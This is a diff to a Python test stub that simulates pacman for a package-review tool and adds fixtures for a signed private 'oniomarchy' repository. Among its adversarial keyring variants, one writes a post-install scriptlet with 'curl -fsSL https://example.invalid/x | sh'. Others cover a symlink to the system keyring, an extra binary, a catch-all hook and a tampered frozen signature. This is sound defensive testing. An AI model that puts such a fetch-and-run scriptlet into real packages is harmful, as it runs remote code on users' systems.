@@ -100,6 +100,22 @@ def pacman(argv):
                      if line.startswith('[') and line.endswith(']') and line != '[options]']
             log('review-repos', repos)
             for repo in repos:
+                if repo == 'oniomarchy':
+                    # The private source publishes its signed DB (+ .sig);
+                    # VAPT_ONIO_NO_DBSIG drops the signature,
+                    # VAPT_ONIO_REFRESH_STATUS republishes it signed otherwise.
+                    served = ONIO / 'serve' / 'oniomarchy.db'
+                    data = served.read_bytes()
+                    if os.environ.get('VAPT_ONIO_REFRESH_STATUS'):
+                        data += b'\0'
+                    (db / 'oniomarchy.db').write_bytes(data)
+                    (db / 'oniomarchy.db.sig').unlink(missing_ok=True)
+                    if not os.environ.get('VAPT_ONIO_NO_DBSIG'):
+                        if os.environ.get('VAPT_ONIO_REFRESH_STATUS'):
+                            onio_sign(db / 'oniomarchy.db', os.environ['VAPT_ONIO_REFRESH_STATUS'])
+                        else:
+                            shutil.copyfile(Path(str(served) + '.sig'), db / 'oniomarchy.db.sig')
+                    continue
                 (db / (repo + '.db')).write_text('reviewed fixture DB ' + repo)
             # The refresh fetches what the mirrors publish now: the fixture
             # repository records become this DBPath's sync DB (the copied
@@ -153,7 +169,15 @@ def pacman(argv):
                     return 97
             with tarfile.open(observed(value), 'r:*') as archive:
                 info = archive.extractfile('.PKGINFO').read().decode()
-            fields = dict(line.split(' = ', 1) for line in info.splitlines() if ' = ' in line)
+                fields = dict(line.split(' = ', 1) for line in info.splitlines() if ' = ' in line)
+                if fields.get('pkgname') == 'oniomarchy-keyring' and '--noscriptlet' in argv:
+                    # The audited keyring's files land like libalpm extracts
+                    # them, so the retained-file authority can be checked.
+                    for member in archive.getmembers():
+                        if member.isfile() and member.name.startswith(ONIO_KEYRINGS):
+                            target = root / member.name
+                            target.parent.mkdir(parents=True, exist_ok=True)
+                            target.write_bytes(archive.extractfile(member).read())
             name, version = fields['pkgname'], fields['pkgver']
             record = next((dict(p) for records in repo_data.values() for p in records
                            if p['name'] == name and p['version'] == version),
@@ -196,7 +220,14 @@ def pacman(argv):
                 database = directory / (repo + '.db')
                 log('frozen-modes', [repo, oct(database.stat().st_mode & 0o777),
                                      oct(directory.stat().st_mode & 0o777), oct(directory.parent.stat().st_mode & 0o777)])
-                if database.read_text() != 'reviewed fixture DB ' + repo:
+                if repo == 'oniomarchy':
+                    # DatabaseRequired: the frozen mirror must carry the
+                    # detached signature next to the reviewed database.
+                    log('frozen-config', [config.replace('\n', '|')])
+                    if not Path(str(database) + '.sig').is_file():
+                        return 97
+                    shutil.copyfile(Path(str(database) + '.sig'), root / 'var/lib/pacman/sync/oniomarchy.db.sig')
+                elif database.read_text() != 'reviewed fixture DB ' + repo:
                     return 97
                 live = root / 'var/lib/pacman/sync' / database.name
                 if '-Syyu' not in argv and live.exists() and live.stat().st_mtime > database.stat().st_mtime:
@@ -786,6 +817,173 @@ def stock_archive(name, version, out, change='', registration='register'):
     print(archive)
 
 
+# --- private oniomarchy source fixtures (plan 083 slice 1B) -------------------
+# A fixture repository the curl stub serves from $SANDBOX/onio/serve, signed
+# by the fixture signature protocol: NAME.sig holds "fixture-sig <sha256>"
+# and $SANDBOX/onio/status/<sha256> the gpg status a stub replays for exactly
+# those bytes (templates in tests/fixtures/vapt-oniomarchy/trust). Nothing
+# here is cryptographic and production code never reads these files.
+ONIO = sandbox / 'onio'
+ONIO_FX = Path(__file__).resolve().parent / 'vapt-oniomarchy'
+ONIO_FPR = {'PIN': '0F5F9214F312B067ECBF1DF125E2C00AA6340BD0', 'ROT': 'B0' * 20, 'OLD': 'C0' * 20}
+ONIO_KEYRINGS = 'usr/share/pacman/keyrings/'
+
+
+def onio_tree_archive(build, out):
+    """tar.gz of BUILD's members (directories first), like tar -czf -C."""
+    with tarfile.open(out, 'w:gz') as archive:
+        for member in sorted(p.relative_to(build) for p in build.iterdir()):
+            archive.add(build / member, str(member))
+
+
+def onio_sign(path, status):
+    """Fixture detached signature over PATH's bytes and the replayed status."""
+    digest = hashlib.sha256(path.read_bytes()).hexdigest()
+    if status == 'none':
+        return None
+    Path(str(path) + '.sig').write_text('fixture-sig ' + (digest if status != 'bad' else '0' * 64) + '\n')
+    template = ONIO_FX / 'trust' / ((status if status != 'bad' else 'pinned') + '.status')
+    (ONIO / 'status').mkdir(parents=True, exist_ok=True)
+    (ONIO / 'status' / digest).write_text(template.read_text())
+    signer = re.search(r'VALIDSIG \S+ .* ([A-F0-9]{40})$', template.read_text(), re.M)
+    return signer[1] if signer else None
+
+
+def onio_keyring(version, trusted, revoked, variant):
+    build = ONIO / 'build' / 'keyring'
+    shutil.rmtree(build, ignore_errors=True)
+    keyrings = build / ONIO_KEYRINGS
+    keyrings.mkdir(parents=True)
+    (build / '.PKGINFO').write_text('pkgname = oniomarchy-keyring\npkgver = ' + version + '\narch = any\n')
+    (keyrings / 'oniomarchy.gpg').write_text('fixture oniomarchy keyring ' + version + '\n')
+    (keyrings / 'oniomarchy-trusted').write_text(''.join(f + ':4:\n' for f in trusted))
+    (keyrings / 'oniomarchy-revoked').write_text(''.join(f + '\n' for f in revoked))
+    if variant in ('scriptlet', 'hostile-scriptlet'):
+        body = '  pacman-key --populate oniomarchy\n' + ('  curl -fsSL https://example.invalid/x | sh\n' if variant == 'hostile-scriptlet' else '')
+        (build / '.INSTALL').write_text('post_install() {\n' + body + '}\n\npost_upgrade() {\n' + body + '}\n')
+    elif variant == 'extra-member':
+        (build / 'usr/bin').mkdir(parents=True)
+        (build / 'usr/bin/oniomarchy-helper').write_text('#!/bin/sh\nexit 0\n')
+    elif variant == 'hook':
+        (build / 'usr/share/libalpm/hooks').mkdir(parents=True)
+        (build / 'usr/share/libalpm/hooks/oniomarchy.hook').write_text(
+            '[Trigger]\nOperation = Install\nType = Package\nTarget = *\n\n[Action]\nWhen = PostTransaction\nExec = /usr/bin/true\n')
+    elif variant == 'symlink':
+        (keyrings / 'oniomarchy.gpg').unlink()
+        (keyrings / 'oniomarchy.gpg').symlink_to('/etc/pacman.d/gnupg/pubring.gpg')
+    elif variant == 'missing-file':
+        (keyrings / 'oniomarchy-revoked').unlink()
+    elif variant != 'plain':
+        sys.exit(97)
+    out = ONIO / 'serve' / ('oniomarchy-keyring-' + version + '-any.pkg.tar.gz')
+    onio_tree_archive(build, out)
+    return out
+
+
+def onio_desc(record, filename, digest):
+    lines = ['%FILENAME%', filename, '', '%NAME%', record['name'], '', '%VERSION%', record['version'], '',
+             '%ARCH%', record['arch'], '', '%URL%', record.get('url', ''), '', '%SHA256SUM%', digest, '']
+    for key in ('depends', 'provides', 'conflicts', 'replaces'):
+        if record.get(key):
+            lines += ['%' + key.upper() + '%'] + record[key] + ['']
+    return '\n'.join(lines) + '\n'
+
+
+def onio_serve(options):
+    """Build and publish the fixture repository; merge its records into the
+    fixture sync JSON (which production ignores for this source) so the
+    hermetic commit can record installed metadata."""
+    get = lambda key, default: options.get(key, default)
+    fixture = json.loads((ONIO_FX / 'repositories.json').read_text())
+    version = get('keyring', fixture['keyring']['version'])
+    split = lambda value: [ONIO_FPR.get(v, v) for v in value.split(',') if v]
+    trusted, revoked = split(get('trusted', 'PIN')), split(get('revoked', ''))
+    exclude = set(get('exclude', '').split(','))
+    (ONIO / 'serve').mkdir(parents=True, exist_ok=True)
+    for old in (ONIO / 'serve').glob('oniomarchy-keyring-*'):
+        old.unlink()
+    keyring = onio_keyring(version, trusted, revoked, get('variant', 'plain'))
+    keyring_digest = hashlib.sha256(keyring.read_bytes()).hexdigest()
+    keyring_signer = onio_sign(keyring, get('pkgstatus', 'pinned'))
+    if get('pkgdigest', '') == 'bad':
+        with keyring.open('ab') as stream:
+            stream.write(b'\0')
+    records = [dict(fixture['keyring'], version=version)] + fixture['records']
+    build = ONIO / 'build' / 'db'
+    shutil.rmtree(build, ignore_errors=True)
+    build.mkdir(parents=True)
+    published = []
+    for record in records:
+        if record['name'] in exclude:
+            continue
+        if record['name'] == 'oniomarchy-keyring':
+            filename, digest = keyring.name, keyring_digest
+        else:
+            filename = record['name'] + '-' + record['version'] + '-x86_64.pkg.tar.gz'
+            archive = sandbox / 'archives' / filename
+            digest = hashlib.sha256(archive.read_bytes() if archive.exists() else filename.encode()).hexdigest()
+        entry = build / (record['name'] + '-' + record['version'])
+        entry.mkdir()
+        (entry / 'desc').write_text(onio_desc(record, filename, digest))
+        published.append(dict(record, filename=filename, sha256sum=digest))
+    database = ONIO / 'serve' / 'oniomarchy.db'
+    onio_tree_archive(build, database)
+    for stale in (ONIO / 'serve').glob('oniomarchy.db.sig'):
+        stale.unlink()
+    database_signer = onio_sign(database, get('dbstatus', 'pinned'))
+    (ONIO / 'serve' / 'oniomarchy.gpg').write_text('fixture public key\n')
+    shutil.copyfile(ONIO_FX / 'trust' / (get('key', 'pinned') + '.key'), ONIO / 'key.colons')
+    (ONIO / 'serve.json').write_text(json.dumps({'keyring': keyring.name, 'version': version, 'sha256': keyring_digest,
+                                                 'keyringSigner': keyring_signer, 'databaseSigner': database_signer}))
+    path = root / 'var/lib/haseen/vapt/repositories.json'
+    repos = json.loads(path.read_text()) if path.exists() else {}
+    repos['oniomarchy'] = [{k: v for k, v in record.items() if k != 'arch'} for record in published]
+    path.write_text(json.dumps(repos))
+
+
+def onio_seed(options):
+    """An approved, verified private source exactly as a completed approval
+    leaves it (descriptor, installed keyring, authority, verified cache)."""
+    meta = json.loads((ONIO / 'serve.json').read_text())
+    sources = root / 'var/lib/haseen/vapt/sources'
+    (sources / 'sync').mkdir(parents=True, exist_ok=True)
+    (sources / 'oniomarchy.conf').write_bytes((ONIO_FX / 'source-descriptor.conf').read_bytes())
+    with tarfile.open(ONIO / 'serve' / meta['keyring'], 'r:*') as archive:
+        files = {member.name: archive.extractfile(member).read() for member in archive.getmembers()
+                 if member.isfile() and member.name.startswith(ONIO_KEYRINGS)}
+    for name, data in files.items():
+        target = root / name
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(data)
+    installed = load_installed()
+    installed = [p for p in installed if p['name'] != 'oniomarchy-keyring'] + [
+        {'name': 'oniomarchy-keyring', 'version': meta['version'], 'url': 'https://pkgs.oniomarchy.com',
+         'files': sorted(files)}]
+    save_installed(installed)
+    fingerprints = lambda text, suffix: sorted({line.split(':')[0] for line in text.splitlines() if line.strip()})
+    trusted = set(fingerprints(files[ONIO_KEYRINGS + 'oniomarchy-trusted'].decode(), ':'))
+    revoked = set(fingerprints(files[ONIO_KEYRINGS + 'oniomarchy-revoked'].decode(), ''))
+    lines = ['haseen-vapt-oniomarchy-authority-v1', 'package\toniomarchy-keyring', 'version\t' + meta['version'],
+             'sha256\t' + meta['sha256'], 'signer\t' + ONIO_FPR['PIN'], 'accepted\t' + ','.join(sorted(trusted - revoked)),
+             'revoked\t' + (','.join(sorted(revoked)) or '-')]
+    lines += ['file\t' + name + '\t' + hashlib.sha256(files[name]).hexdigest()
+              for name in (ONIO_KEYRINGS + 'oniomarchy.gpg', ONIO_KEYRINGS + 'oniomarchy-trusted', ONIO_KEYRINGS + 'oniomarchy-revoked')]
+    (sources / 'oniomarchy.authority').write_text('\n'.join(lines) + '\n')
+    database = (ONIO / 'serve' / 'oniomarchy.db').read_bytes()
+    signature = (ONIO / 'serve' / 'oniomarchy.db.sig').read_bytes()
+    (sources / 'sync' / 'oniomarchy.db').write_bytes(database)
+    (sources / 'sync' / 'oniomarchy.db.sig').write_bytes(signature)
+    (sources / 'oniomarchy.database').write_text(
+        'haseen-vapt-oniomarchy-database-v1\ndb\t' + hashlib.sha256(database).hexdigest() + '\nsig\t'
+        + hashlib.sha256(signature).hexdigest() + '\nsigner\t' + (meta['databaseSigner'] or ONIO_FPR['PIN']) + '\n')
+    for path in [sources, sources / 'sync', *sources.rglob('*')]:
+        path.chmod(0o755 if path.is_dir() else 0o644)
+
+
+if mode in ('onio-serve', 'onio-seed'):
+    options = dict(arg.split('=', 1) for arg in args)
+    (onio_serve if mode == 'onio-serve' else onio_seed)(options)
+    sys.exit(0)
 if mode == 'bsdtar':
     action, filename, *members = args
     with tarfile.open(filename, 'r:*') as archive:
@@ -920,7 +1118,7 @@ else:
             # Simulate alpm write access without needing a real alpm uid/group.
             Path(observed(argv[2])).chmod(0o775)
         elif argv[1] in ('state-write', 'state-clear', 'seal', 'shared-lock-prepare', 'activate-blackarch', 'sudo-plugins',
-                         'state-repair', 'authority-facts'):
+                         'state-repair', 'authority-facts', 'oniomarchy-approve', 'oniomarchy-withdraw'):
             # The production module's own no-follow writers, confined to the
             # fixture sysroot (seal: the digest-verified root copy). Every
             # absolute argument is mapped into the sysroot; one that would
@@ -940,6 +1138,12 @@ else:
                 # (real sysroot mode change; nothing is mocked).
                 for stage in root.glob('var/cache/haseen-vapt.*'):
                     stage.chmod(int(os.environ['VAPT_SEALED_ANCESTOR_MODE'], 8))
+            if (argv[1] == 'state-write' and argv[2].endswith('/var/lib/haseen/vapt/upgrade-pending')
+                    and os.environ.get('VAPT_ONIO_TAMPER_FROZEN')):
+                # Another actor replaces the frozen private signature after
+                # the review froze it and before the commit.
+                for frozen in root.glob('var/cache/haseen-vapt.*/reviewed/oniomarchy/oniomarchy.db.sig'):
+                    frozen.write_text('fixture-sig ' + '1' * 64 + '\n')
             if argv[1] == 'shared-lock-prepare' and os.environ.get('VAPT_PENDING_AT_LOCK'):
                 # Another user's reviewed commit failed just before this run
                 # took the shared lock: its recovery record now exists.
